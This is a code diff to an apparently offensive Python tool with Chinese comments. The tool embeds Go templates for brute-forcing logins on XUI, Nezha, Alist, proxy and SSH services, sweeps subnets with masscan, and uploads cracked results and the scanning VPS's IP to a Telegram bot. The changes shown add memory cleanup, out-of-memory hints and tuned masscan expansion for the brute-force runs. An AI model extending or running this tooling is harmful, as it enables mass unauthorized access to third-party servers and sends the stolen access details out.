@@ -57,6 +57,7 @@ XUI_GO_TEMPLATE_1_LINES = [
     "	\"os\"",
     "	\"os/signal\"",
     "	\"runtime\"",
+	"   \"runtime/debug\"",
     "	\"strings\"",
     "	\"sync\"",
     "	\"sync/atomic\"",
@@ -65,6 +66,14 @@ XUI_GO_TEMPLATE_1_LINES = [
     ")",
     "var completedCount int64",
     "var isMemoryThrottled int32",
+	"func memoryJanitor() {",
+	"	ticker := time.NewTicker(10 * time.Second)",
+	"	defer ticker.Stop()",
+	"	for range ticker.C {",
+	"		runtime.GC()",
+	"		debug.FreeOSMemory()",
+	"	}",
+	"}",
     "func countLines(filePath string) (int, error) {",
     "	file, err := os.Open(filePath)",
     "	if err != nil { return 0, err }",
@@ -159,6 +168,7 @@ XUI_GO_TEMPLATE_1_LINES = [
     "	}",
     "}",
     "func main() {",
+	"	go memoryJanitor()",
     "	if len(os.Args) < 3 {",
     "		fmt.Println(\"Usage: ./program <inputFile> <outputFile>\")",
     "		os.Exit(1)",
@@ -247,6 +257,7 @@ XUI_GO_TEMPLATE_2_LINES = [
     "	\"os\"",
     "	\"os/signal\"",
     "	\"runtime\"",
+	"   \"runtime/debug\"",
     "	\"strings\"",
     "	\"sync\"",
     "	\"sync/atomic\"",
@@ -255,6 +266,14 @@ XUI_GO_TEMPLATE_2_LINES = [
     ")",
     "var completedCount int64",
     "var isMemoryThrottled int32",
+	"func memoryJanitor() {",
+	"	ticker := time.NewTicker(10 * time.Second)",
+	"	defer ticker.Stop()",
+	"	for range ticker.C {",
+	"		runtime.GC()",
+	"		debug.FreeOSMemory()",
+	"	}",
+	"}",
     "func countLines(filePath string) (int, error) {",
     "	file, err := os.Open(filePath)",
     "	if err != nil { return 0, err }",
@@ -349,6 +368,7 @@ XUI_GO_TEMPLATE_2_LINES = [
     "	}",
     "}",
     "func main() {",
+	"	go memoryJanitor()",
     "	if len(os.Args) < 3 {",
     "		fmt.Println(\"Usage: ./program <inputFile> <outputFile>\")",
     "		os.Exit(1)",
@@ -431,6 +451,7 @@ XUI_GO_TEMPLATE_6_LINES = [
     "	\"os\"",
     "	\"os/signal\"",
     "	\"runtime\"",
+	"   \"runtime/debug\"",
     "	\"strings\"",
     "	\"sync\"",
     "	\"sync/atomic\"",
@@ -440,6 +461,14 @@ XUI_GO_TEMPLATE_6_LINES = [
     ")",
     "var completedCount int64",
     "var isMemoryThrottled int32",
+	"func memoryJanitor() {",
+	"	ticker := time.NewTicker(10 * time.Second)",
+	"	defer ticker.Stop()",
+	"	for range ticker.C {",
+	"		runtime.GC()",
+	"		debug.FreeOSMemory()",
+	"	}",
+	"}",
     "func countLines(filePath string) (int, error) {",
     "	file, err := os.Open(filePath)",
     "	if err != nil { return 0, err }",
@@ -521,6 +550,7 @@ XUI_GO_TEMPLATE_6_LINES = [
     "	return strings.TrimSpace(string(output)) != \"2\"",
     "}",
     "func main() {",
+	"	go memoryJanitor()",
     "	if len(os.Args) < 3 {",
     "		fmt.Println(\"Usage: ./program <inputFile> <outputFile>\")",
     "		os.Exit(1)",
@@ -603,6 +633,7 @@ XUI_GO_TEMPLATE_7_LINES = [
     "	\"os\"",
     "	\"os/signal\"",
     "	\"runtime\"",
+	"   \"runtime/debug\"",
     "	\"strings\"",
     "	\"sync\"",
     "	\"sync/atomic\"",
@@ -611,6 +642,14 @@ XUI_GO_TEMPLATE_7_LINES = [
     ")",
     "var completedCount int64",
     "var isMemoryThrottled int32",
+	"func memoryJanitor() {",
+	"	ticker := time.NewTicker(10 * time.Second)",
+	"	defer ticker.Stop()",
+	"	for range ticker.C {",
+	"		runtime.GC()",
+	"		debug.FreeOSMemory()",
+	"	}",
+	"}",
     "func countLines(filePath string) (int, error) {",
     "	file, err := os.Open(filePath)",
     "	if err != nil { return 0, err }",
@@ -699,6 +738,7 @@ XUI_GO_TEMPLATE_7_LINES = [
     "	return false, nil",
     "}",
     "func main() {",
+	"	go memoryJanitor()",
     "	if len(os.Args) < 3 {",
     "		fmt.Println(\"Usage: ./program <inputFile> <outputFile>\")",
     "		os.Exit(1)",
@@ -781,6 +821,7 @@ XUI_GO_TEMPLATE_8_LINES = [
     "	\"os\"",
     "	\"os/signal\"",
     "	\"runtime\"",
+	"   \"runtime/debug\"",
     "	\"strings\"",
     "	\"sync\"",
     "	\"sync/atomic\"",
@@ -789,6 +830,14 @@ XUI_GO_TEMPLATE_8_LINES = [
     ")",
     "var completedCount int64",
     "var isMemoryThrottled int32",
+	"func memoryJanitor() {",
+	"	ticker := time.NewTicker(10 * time.Second)",
+	"	defer ticker.Stop()",
+	"	for range ticker.C {",
+	"		runtime.GC()",
+	"		debug.FreeOSMemory()",
+	"	}",
+	"}",
     "func countLines(filePath string) (int, error) {",
     "	file, err := os.Open(filePath)",
     "	if err != nil { return 0, err }",
@@ -882,6 +931,7 @@ XUI_GO_TEMPLATE_8_LINES = [
     "	return false",
     "}",
     "func main() {",
+	"	go memoryJanitor()",
     "	if len(os.Args) < 3 {",
     "		fmt.Println(\"Usage: ./program <inputFile> <outputFile>\")",
     "		os.Exit(1)",
@@ -965,6 +1015,7 @@ PROXY_GO_TEMPLATE_LINES = [
     "	\"os\"",
     "	\"os/signal\"",
     "	\"runtime\"",
+	"   \"runtime/debug\"",
     "	\"strings\"",
     "	\"sync\"",
     "	\"sync/atomic\"",
@@ -980,6 +1031,14 @@ PROXY_GO_TEMPLATE_LINES = [
     "	completedCount int64",
     "    isMemoryThrottled int32",
     ")",
+	"func memoryJanitor() {",
+	"	ticker := time.NewTicker(10 * time.Second)",
+	"	defer ticker.Stop()",
+	"	for range ticker.C {",
+	"		runtime.GC()",
+	"		debug.FreeOSMemory()",
+	"	}",
+	"}",
     "func countLines(filePath string) (int, error) {",
     "	file, err := os.Open(filePath)",
     "	if err != nil { return 0, err }",
@@ -1129,6 +1188,7 @@ PROXY_GO_TEMPLATE_LINES = [
     "	return true, nil",
     "}",
     "func main() {",
+	"	go memoryJanitor()",
     "	if len(os.Args) < 3 {",
     "		fmt.Println(\"Usage: ./program <inputFile> <outputFile>\")",
     "		os.Exit(1)",
@@ -1213,6 +1273,7 @@ ALIST_GO_TEMPLATE_LINES = [
     "	\"os\"",
     "	\"os/signal\"",
     "	\"runtime\"",
+	"   \"runtime/debug\"",
     "	\"strings\"",
     "	\"sync\"",
     "	\"sync/atomic\"",
@@ -1221,6 +1282,14 @@ ALIST_GO_TEMPLATE_LINES = [
     ")",
     "var completedCount int64",
     "var isMemoryThrottled int32",
+	"func memoryJanitor() {",
+	"	ticker := time.NewTicker(10 * time.Second)",
+	"	defer ticker.Stop()",
+	"	for range ticker.C {",
+	"		runtime.GC()",
+	"		debug.FreeOSMemory()",
+	"	}",
+	"}",
     "func countLines(filePath string) (int, error) {",
     "	file, err := os.Open(filePath)",
     "	if err != nil { return 0, err }",
@@ -1319,6 +1388,7 @@ ALIST_GO_TEMPLATE_LINES = [
     "	return false",
     "}",
     "func main() {",
+	"	go memoryJanitor()",
     "	if len(os.Args) < 3 {",
     "		fmt.Println(\"Usage: ./program <inputFile> <outputFile>\")",
     "		os.Exit(1)",
@@ -1989,6 +2059,12 @@ def run_xui_for_parts(sleep_seconds, executable_name, total_ips, semaphore_size)
 
             if process.returncode != 0:
                  _, stderr_output = process.communicate()
+                 # 增加对 -9 返回码的特定提示
+                 if process.returncode == -9:
+                     print("\n❌ 错误: 扫描进程被系统杀死 (返回码 -9)，这通常是由于内存不足(OOM)导致的。")
+                     print("   建议措施：")
+                     print("   1. 减少爆破线程数 (`semaphore_size`)。")
+                     print("   2. 增加系统的SWAP交换空间。")
                  raise subprocess.CalledProcessError(process.returncode, cmd, stderr=stderr_output)
 
         except subprocess.CalledProcessError as e:
@@ -2352,6 +2428,7 @@ def parse_result_line(line):
             
     return None, None, None, None
 
+# ==================== 性能与稳定性优化 ====================
 def analyze_and_expand_scan(result_file, template_mode, params, template_map, masscan_rate):
     if not os.path.exists(result_file) or os.path.getsize(result_file) == 0:
         return set()
@@ -2361,8 +2438,7 @@ def analyze_and_expand_scan(result_file, template_mode, params, template_map, ma
         master_results = {line.strip() for line in f}
     
     ips_to_analyze = master_results
-    all_newly_verified_ips = set()
-
+    
     for i in range(2): # 执行两轮扩展
         print(f"\n--- [扩展扫描 第 {i+1}/2 轮] ---")
         
@@ -2392,23 +2468,28 @@ def analyze_and_expand_scan(result_file, template_mode, params, template_map, ma
             print(f"\n  --- [扫描集群 {j+1}/{len(expandable_targets)}] 目标: {subnet} 端口: {port} ---")
             
             masscan_ips_for_this_cluster = set()
-            for k in range(2):
-                print(f"    - Masscan 第 {k+1}/2 轮...")
-                try:
-                    if os.path.exists(masscan_output_file): os.remove(masscan_output_file)
-                    masscan_cmd = ["masscan", subnet, "-p", port, "--rate=" + str(masscan_rate), "-oG", masscan_output_file]
-                    subprocess.run(masscan_cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            print(f"    - Masscan 正在扫描...")
+            try:
+                if os.path.exists(masscan_output_file): os.remove(masscan_output_file)
+                # 优化: 1. 使用用户输入的速率 2. 增加 --wait 确保结果完整 3. 只扫描一次
+                masscan_cmd = ["masscan", subnet, "-p", port, "--rate", str(masscan_rate), "--wait", "5", "-oG", masscan_output_file]
+                subprocess.run(masscan_cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-                    with open(masscan_output_file, 'r') as f:
-                        for line in f:
-                            if line.startswith("Host:"):
-                                masscan_ips_for_this_cluster.add(line.split()[1])
-                except (subprocess.CalledProcessError, FileNotFoundError) as e:
-                    print(f"      - ❌ Masscan 扫描失败: {e}")
+                with open(masscan_output_file, 'r') as f:
+                    for line in f:
+                        if line.startswith("Host:"):
+                            masscan_ips_for_this_cluster.add(line.split()[1])
+            except (subprocess.CalledProcessError, FileNotFoundError) as e:
+                print(f"      - ❌ Masscan 扫描失败: {e}")
             
-            ips_to_verify = masscan_ips_for_this_cluster - master_results
-            print(f"    - Masscan 两轮共发现 {len(masscan_ips_for_this_cluster)} 个存活主机，其中 {len(ips_to_verify)} 个是新目标。")
+            # 从已发现的结果中排除，避免重复验证
+            known_ips_in_cluster = {line.split()[0].split(':')[0] for line in master_results if f":{port}" in line}
+            ips_to_verify = masscan_ips_for_this_cluster - known_ips_in_cluster
+            
+            print(f"    - Masscan 发现 {len(masscan_ips_for_this_cluster)} 个存活主机，其中 {len(ips_to_verify)} 个是新目标。")
             if not ips_to_verify:
+                # 优化：在扫描下一个集群前增加短暂休眠
+                time.sleep(2)
                 continue
 
             verification_input_file = "verification_input.tmp"
@@ -2460,6 +2541,9 @@ def analyze_and_expand_scan(result_file, template_mode, params, template_map, ma
                 print(f"    - ❌ 二次验证失败: {e}")
             
             if os.path.exists(verification_input_file): os.remove(verification_input_file)
+            
+            # 优化：在扫描下一个集群前增加短暂休眠
+            time.sleep(2)
         
         new_ips_this_round = newly_verified_this_round - master_results
         if not new_ips_this_round:
@@ -2474,7 +2558,7 @@ def analyze_and_expand_scan(result_file, template_mode, params, template_map, ma
     with open(result_file, 'r', encoding='utf-8') as f:
         initial_set = {line.strip() for line in f}
     return master_results - initial_set
-
+# ==========================================================
 
 if __name__ == "__main__":
     start = time.time()
@@ -2522,13 +2606,11 @@ if __name__ == "__main__":
         params = {}
         params['semaphore_size'] = input_with_default(f"爆破线程数 (根据内存推荐 {recommended_threads})", recommended_threads)
         params['timeout'] = input_with_default("超时时间(秒)", 3)
-        masscan_rate = input_with_default("请输入Masscan扫描速率(pps)", 50000)
+        masscan_rate = input_with_default("请输入Masscan扫描速率(pps, 建议 1000-5000)", 2000)
         
-        # ==================== 新增修改：提前询问哪吒分析线程数 ====================
         nezha_analysis_threads = 0
         if TEMPLATE_MODE == 2:
             nezha_analysis_threads = input_with_default("请输入哪吒面板分析线程数", 50)
-        # =================================================================
 
         AUTH_MODE = 0
         if TEMPLATE_MODE == 6: # SSH 模式
@@ -2622,10 +2704,8 @@ if __name__ == "__main__":
             run_ipcx(final_txt_file, final_xlsx_file)
 
         if TEMPLATE_MODE == 2 and os.path.exists(final_txt_file) and os.path.getsize(final_txt_file) > 0:
-            # ==================== 修改：使用预设的线程数 ====================
             analysis_threads = nezha_analysis_threads
             print(f"\n--- 开始对成功的哪吒面板进行深度分析（使用 {analysis_threads} 线程）... ---")
-            # =============================================================
             with open(final_txt_file, 'r', encoding='utf-8') as f:
                 results = [line.strip() for line in f if line.strip()]
             
@@ -2673,22 +2753,18 @@ if __name__ == "__main__":
             vps_ip, vps_country = get_vps_info()
             nezha_server = get_nezha_server()
             
-            # ==================== 修改：格式化运行时间 ====================
             run_time_str = f"{cost // 60} 分 {cost % 60} 秒"
             if interrupted:
                     print(f"\n=== 脚本已被中断，中止前共运行 {run_time_str} ===")
             else:
                     print(f"\n=== 全部完成！总用时 {run_time_str} ===")
-            # ============================================================
 
-            # ==================== 修改：Telegram 发送函数及调用 ====================
             def send_to_telegram(file_path, bot_token, chat_id, vps_ip="N/A", vps_country="N/A", nezha_server="N/A", total_ips=0, run_time_str="N/A"):
                     if not os.path.exists(file_path) or os.path.getsize(file_path) == 0:
                             print(f"⚠️ Telegram 上传跳过：文件 {file_path} 不存在或为空")
                             return
 
                     url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
-                    # 修正换行符并添加新信息
                     caption_text = (
                         f"VPS: {vps_ip} ({vps_country})\n"
                         f"总目标数: {total_ips}\n"
@@ -2729,5 +2805,4 @@ if __name__ == "__main__":
 
                 for f in files_to_send:
                     print(f"\n📤 正在将 {f} 上传至 Telegram ...")
-                    # 传递新增的参数
                     send_to_telegram(f, BOT_TOKEN, CHAT_ID, vps_ip, vps_country, nezha_server, total_ips, run_time_str)
